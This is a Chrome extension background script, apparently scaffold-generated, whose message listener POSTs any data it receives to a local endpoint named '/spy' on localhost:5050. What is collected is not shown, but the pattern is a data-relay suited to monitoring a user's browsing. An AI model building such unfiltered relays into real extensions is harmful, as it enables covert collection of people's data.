'use strict';

chrome.runtime.onInstalled.addListener(function (details) {
  console.log('previousVersion', details.previousVersion);
});

console.log('\'Allo \'Allo! Event Page');

chrome.runtime.onMessage.addListener(function(request, sender, callback) {
  var xhr = new XMLHttpRequest;
  xhr.open('POST', 'http://localhost:5050/spy');
  xhr.send(JSON.stringify(request.data));
});